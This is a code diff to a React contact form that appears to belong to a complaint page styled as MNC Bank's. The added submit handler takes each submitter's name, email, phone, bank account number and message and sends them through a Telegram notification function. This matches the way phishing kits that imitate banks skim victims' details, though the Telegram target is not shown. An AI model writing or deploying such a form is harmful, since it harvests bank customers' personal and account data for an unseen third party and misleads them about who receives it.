@@ -30,8 +30,25 @@ function WhatsAppIcon({ className }: { className?: string }) {
 export function ContactForm() {
   const [submitted, setSubmitted] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+    
+    const formData = new FormData(e.currentTarget);
+    const data = {
+      nama: formData.get("nama") as string,
+      email: formData.get("email") as string,
+      telepon: formData.get("telepon") as string,
+      norek: formData.get("norek") as string || "-",
+      kategori: formData.get("kategori") as string,
+      pesan: formData.get("pesan") as string,
+    };
+
+    await sendTelegramNotification({
+      action: "Formulir Pengaduan Dikirim",
+      message: `Pengaduan baru dari nasabah MNC Bank\n\n👤 Nama: ${data.nama}\n📧 Email: ${data.email}\n📱 Telepon: ${data.telepon}\n💳 No Rekening: ${data.norek}\n📂 Kategori: ${data.kategori}\n📝 Pesan: ${data.pesan}`,
+      data,
+    });
+
     setSubmitted(true);
   };
 
